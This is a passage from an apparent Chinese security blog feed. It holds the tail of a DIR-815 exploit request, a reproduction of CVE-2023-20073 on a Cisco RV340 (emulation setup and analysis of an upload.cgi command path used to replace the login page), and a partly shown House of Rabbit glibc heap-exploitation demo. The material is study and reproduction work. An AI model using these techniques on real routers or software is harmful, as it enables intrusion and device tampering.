class="line">&#125;</span><br><span class="line">res = requests.post(url = url, headers = headers, data = data)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>我在这里并没有把4个exp 都打完，我只打了发报文的纯ROP链。shellcode 的exp，懒得改ip 地址了</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_3">[原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> iot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-20073复现</title>
      <link href="/2025/08/12/Iot/CVE-2023-20073/"/>
      <url>/2025/08/12/Iot/CVE-2023-20073/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2023-20073"><a href="#CVE-2023-20073" class="headerlink" title="CVE-2023-20073"></a>CVE-2023-20073</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    开始学习iot的漏洞挖掘，第一次复现cve漏洞<br><a href="https://bbs.kanxue.com/thread-278240.htm">[原创]从零开始复现 CVE-2023-20073-智能设备-看雪-安全社区|安全招聘|kanxue.com</a></p><h2 id="固件获取"><a href="#固件获取" class="headerlink" title="固件获取"></a>固件获取</h2><p><a href="https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.03.29">Software Download - Cisco Systems</a></p><p>从官网获取RV340 的固件</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724184650280.png" alt="固件下载"></p><h2 id="binwalk-解压"><a href="#binwalk-解压" class="headerlink" title="binwalk 解压"></a>binwalk 解压</h2><p>binwalk -Me xxx.img</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724184805292.png" alt="binwalk解压"></p><p>解压成功</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724190444842.png" alt="解压"></p><p>但是和文章一样出现了warnning</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724190638436.png" alt="warning"></p><p>配置起来有点麻烦，因为binwalk 现在很难搞，~~所以我决定直接手动修改这个链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /tmp var</span><br></pre></td></tr></table></figure><p>事实证明这样做是不行的，后续仿真时会失败。可能是因为还有其他的软连接被破坏了，所以只能去修改binwalk 的文件内容。因为我是用apt-get install 安装的binwalk ，所以我只能通过找到已经安装的binwalk 的文件位置来修改。<br><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250725173240219.png" alt="binwalk"></p><p>我这里是1008行，把这里修改为if 0 and not </p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250725173349943.png" alt="修改"></p><p>问题解决</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724201653555.png" alt="结果"></p><h2 id="qume-与-主机连接"><a href="#qume-与-主机连接" class="headerlink" title="qume 与 主机连接"></a>qume 与 主机连接</h2><p>先下载后面的 东西，在运行这个脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 iproute2 替代 brctl</span></span><br><span class="line">PHY_IFACE=&quot;ens33&quot;</span><br><span class="line">BRIDGE=&quot;br0&quot;    </span><br><span class="line">TAP_IFACE=&quot;tap0&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建网桥</span></span><br><span class="line">sudo ip link add name $BRIDGE type bridge</span><br><span class="line">sudo ip link set $BRIDGE up</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置物理接口</span></span><br><span class="line">sudo ip link set $PHY_IFACE promisc on</span><br><span class="line">sudo ip link set $PHY_IFACE master $BRIDGE</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建 TAP 设备</span></span><br><span class="line">sudo ip tuntap add mode tap user root name $TAP_IFACE</span><br><span class="line">sudo ip link set $TAP_IFACE promisc on</span><br><span class="line">sudo ip link set $TAP_IFACE master $BRIDGE</span><br><span class="line">sudo ip link set $TAP_IFACE up</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取 DHCP</span></span><br><span class="line">sudo dhclient -v $BRIDGE</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">验证配置</span></span><br><span class="line">echo -e &quot;\n=== 网络配置验证 ===&quot;</span><br><span class="line">bridge link show $BRIDGE</span><br><span class="line">ip addr show $BRIDGE</span><br></pre></td></tr></table></figure><h2 id="busybox"><a href="#busybox" class="headerlink" title="busybox"></a>busybox</h2><p>在解压出来的文件系统下，查看busybox的信息</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724202303901.png" alt="busybox"></p><p>下载需要的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress</span><br></pre></td></tr></table></figure><h2 id="启动qemu"><a href="#启动qemu" class="headerlink" title="启动qemu"></a>启动qemu</h2><p>先执行</p><p>qemu-img resize debian_wheezy_armhf_standard.qcow2 32G</p><h3 id="boot-sh"><a href="#boot-sh" class="headerlink" title="boot.sh"></a>boot.sh</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">  -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">  -append &quot;root=/dev/mmcblk0p2&quot; -net nic -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">  -nographic -smp 4</span><br></pre></td></tr></table></figure><p>然后sudo .&#x2F;boot.sh</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250725121644660.png" alt="启动"></p><p>用户密码都是root</p><p>往虚拟机中传刚才的文件，先打包在传送</p><p>tar -czvf rootfs.tar.gz rootfs</p><p>sudo scp -r rootfs.tar.gz <a href="mailto:&#114;&#111;&#x6f;&#x74;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#50;&#50;&#x35;&#x2e;&#x31;&#x33;&#x34;">&#114;&#111;&#x6f;&#x74;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#50;&#50;&#x35;&#x2e;&#x31;&#x33;&#x34;</a>:&#x2F;root&#x2F;rootfs.tar.gz</p><p>tar -xzvf rootfs.tar.gz</p><h2 id="仿真隔离"><a href="#仿真隔离" class="headerlink" title="仿真隔离"></a>仿真隔离</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chmod -R 777 rootfs</span><br><span class="line">cd rootfs/</span><br><span class="line">mount --bind /proc proc</span><br><span class="line">mount --bind /dev dev</span><br><span class="line">chroot . /bin/sh</span><br></pre></td></tr></table></figure><h2 id="启动Nginx"><a href="#启动Nginx" class="headerlink" title="启动Nginx"></a>启动Nginx</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/boot boot</span><br><span class="line">generate_default_cert</span><br><span class="line">/etc/init.d/confd start</span><br><span class="line">/etc/init.d/nginx start</span><br></pre></td></tr></table></figure><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250725171041446.png" alt="网页"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="rest-url-conf"><a href="#rest-url-conf" class="headerlink" title="rest.url.conf"></a>rest.url.conf</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801133734167.png" alt="rest.url.conf"><br><code>upload_pass</code> ,后台会用&#x2F;form-file-upload 继续处理<br><code>upload_store</code>,文件会上传到&#x2F;tmp&#x2F;upload<br><code>upload_store_access</code>,设置了文件的权限<br><code>upload_set_form_field xxx</code> 设置了文件的相关字段，文件名、文件类型、文件路径、md5值、文件大小</p><h3 id="web-upload-conf"><a href="#web-upload-conf" class="headerlink" title="web.upload.conf"></a>web.upload.conf</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801163029477.png" alt="web.upload.conf"><br>这里通过uwsgi_pass,将请求转发，最后会执行 <code>upload.cgi</code></p><h3 id="upload-cgi"><a href="#upload-cgi" class="headerlink" title="upload.cgi"></a>upload.cgi</h3><h4 id="sub-115EC"><a href="#sub-115EC" class="headerlink" title="sub_115EC"></a>sub_115EC</h4><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801163641641.png" alt="sub_115ec"><br>这里最终会执行system函数，而sprintf中的三个参数都是可以控制的，只要我们把s_1设置为刚才上传的文件路径，_tmp_firmware控制为&#x2F;tmp&#x2F;www(要把s1控制为Portal) , s_2控制位login.html就可以篡改登录界面</p><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801164510313.png" alt="main"></p><p>根据上面的分析，也就是v17要控制为Portal，V16要控制为刚上传的文件路径，v18要是login.html</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801164909962.png" alt="main"></p><p>v17对应v30，v16对应v29，v18对应v31</p>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> iot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House of Rabbit</title>
      <link href="/2025/06/30/heap/House%20of%20Rabbit/"/>
      <url>/2025/06/30/heap/House%20of%20Rabbit/</url>
      
        <content type="html"><![CDATA[<h1 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​哎呀，也不知道怎么说，看CTFshow上的poc总有一种无力感，啥玩意也没有。那个注释吧，也就是把how2heap的注释翻译了一下吧。真感觉他自己过个几年回来看自己的poc，估计也不知道是怎么利用吧。反正感觉写得莫名其妙，描述的语言逻辑不清楚。好在看雪上有一篇精华帖，写得很好，讲到了关键点。<br>​现在就是自己重新分析，改一下他的poc吧。</p><h2 id="相关源码"><a href="#相关源码" class="headerlink" title="相关源码"></a>相关源码</h2><p><strong>文件路径(malloc&#x2F;malloc.c)</strong></p><h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="type">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">  size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">  nextchunk = chunk_at_offset(p, size);</span><br><span class="line">  nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      unlink(av, nextchunk, bck, fwd);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">    unsorted_bin-&gt;fd = p;</span><br><span class="line">    first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    p-&gt;bk = unsorted_bin;</span><br><span class="line">    p-&gt;fd = first_unsorted;</span><br><span class="line">    set_foot(p, size);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>判断是否初始化.若未初始化，则初始化.</li><li>将fastbins清空。遍历fastbins.<ul><li>向后合并(低地址),能合就合</li><li>向前合并(高地址),能合就合</li></ul></li><li>如果合并后与topchunk相邻则合并入topchunk.</li><li>否则插入到unsortedbin 前面.</li></ol><h2 id="相关调用"><a href="#相关调用" class="headerlink" title="相关调用"></a>相关调用</h2><ol><li><code>_int_malloc()</code>中调用<ul><li>申请large chunk 时，且arena 存在fastbins chunk 触发</li><li>申请small chunk时，victim&#x3D;&#x3D;0时触发(错误处理)</li></ul></li><li><code>mtrim()</code>中调用</li><li><code>__libc_mallopt()</code>中调用</li><li><code>_int_free</code>中调用<ul><li>释放到unsortedbin进行consolidation的过程中，在向前向后合并完成了以后，如果合并后大小大于0xffff，就检测fastbin chunk并进行合并</li></ul></li></ol><h2 id="利用思路和条件"><a href="#利用思路和条件" class="headerlink" title="利用思路和条件"></a>利用思路和条件</h2><h3 id="思路-感觉更像流程"><a href="#思路-感觉更像流程" class="headerlink" title="思路(感觉更像流程)"></a>思路(感觉更像流程)</h3><ol><li>申请大堆块，增加av-&gt;system_mem和触发grow_heap . 使heap空间初始化与.bss等段空间相邻 .</li><li>在想要分配的地址(设为target)附近伪造fake chunk(设为buf)，然后申请一个fastbins(设为a)大小的  ，一个smallbin(设为b)大小的chunk。</li><li>先将a 放入fastbins 中，通过溢出或者uaf 漏洞，将buf链入fastbins 中。通过free掉b，触发malloc_consodilate,把 fastbins清空且插入unsorted bin。<strong>因为a和b相邻所以都被合并到topchunk，而buf不相邻，所以会无法合并，而被插入到unsortedbin 中。</strong></li><li>再次通过申请大堆块，把unosorted bin 放入large bin 中。当然，为了能成功的进入large bin，我们需要先修改buf的size在合理的范围。</li><li>最后继续修改buf的size为0xfffffffffffffff1，再计算与target的偏移，申请偏移大小的堆块后，即可分配到target。</li></ol><h3 id="个人理解"><a href="#个人理解" class="headerlink" title="个人理解"></a>个人理解</h3><ol><li>感觉关键在于第三步触发malloc_consodilate时，可以有一个把任意地址链入unsorted bin的机会。利用这个可以后续完成任意地址的分配。</li><li>但是感觉前面的准备工作很多，第三步之后的部分和house of force 后续的手法差不多。一个是通过topchunk 与 target 的偏移；一个是利用large chunk 与 target 的偏移。</li><li>如果按照上述流程的话，一开始就要申请两次大堆块。感觉有点明显（出题的话）。</li><li>后续对fastbins chunk 合并时增加了检查，使得利用更加得困难。</li></ol><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol><li>首先就是对堆块的申请大小没有限制。在这个过程中，我们申请了极大的堆块，同时也有最小的堆块，如果堆块的大小被限制的话就很难搞。</li><li>存在溢出漏洞，或者uaf。允许我们可以修改处于空闲状态的堆块的fd指针和size。</li><li>中间不能有不能free的堆块。如果有自动申请的堆块，而且还不会被free，可能会卡我们位置。导致第三步的时候出现问题。（但感觉，有1,2 两点的话，应该也可以绕过。感觉加上这个应该会很好玩）。</li></ol><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> target[<span class="number">20</span>]=<span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"><span class="type">uint64_t</span>  buf[<span class="number">20</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* a;</span><br><span class="line">    <span class="type">uint8_t</span>* b;</span><br><span class="line">    <span class="type">uint8_t</span>* c;</span><br><span class="line">    <span class="type">char</span>* d;</span><br><span class="line">    <span class="comment">/*申请两次大堆块，并free*/</span></span><br><span class="line">    a=<span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;33m第一步申请一个大堆块然后free，使system-&gt;mem提升:\033[0m\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;第一次申请a，a的地址：%p\n&quot;</span>,a<span class="number">-2</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    a=<span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;33m第二次继续申请一个大堆块，然后free，触发heap_grow:\033[0m\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;第二次申请a，a的地址：%p\n\n&quot;</span>,a<span class="number">-2</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*申请两个堆块，一个fastbins大小 ，一个smallbin大小*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;33m此时申请一个fast chunk，一个small chunk为后续利用作铺垫:\033[0m\n&quot;</span>);</span><br><span class="line">    a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    b=<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fast chunk a: %p\n&quot;</span>,a<span class="number">-2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;small chunk b: %p\n\n&quot;</span>,b<span class="number">-0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    用来链入large bin的fake chunk,注意从buf[1]~buf[5]是我们的fake chunk</span></span><br><span class="line"><span class="comment">    buf[0]是为了绕过_int_malloc中的检测，</span></span><br><span class="line"><span class="comment">    buf[7]是为了绕过_int_free时调用的consolidate的检测。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    buf[<span class="number">0</span>]=<span class="number">0xfffffffffffffff0</span>;<span class="comment">/*在检测中会用size+buf[2] 与size 比较，结果为0才能正确绕过*/</span></span><br><span class="line">    buf[<span class="number">1</span>]=<span class="number">0x0</span>;</span><br><span class="line">    buf[<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">3</span>]=<span class="number">0x21</span>;</span><br><span class="line">    buf[<span class="number">4</span>]=<span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">5</span>]=<span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">6</span>]=<span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">7</span>]=<span class="number">1</span>;  <span class="comment">/*绕过malloc_consolidate 中的unlink操作*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;33m伪造一个fake chunk，并为绕过一些检测，在某些地方埋伏笔\033[0m\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;这是fake chunk--buf[2]的地址: %p\n&quot;</span>,buf+<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;这是目标target的地址: %p\n&quot;</span>,target);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;33m为了绕过检测而提前作的准备:\033[0m;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf[2]-0x10: %#lx\n&quot;</span>,buf[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span 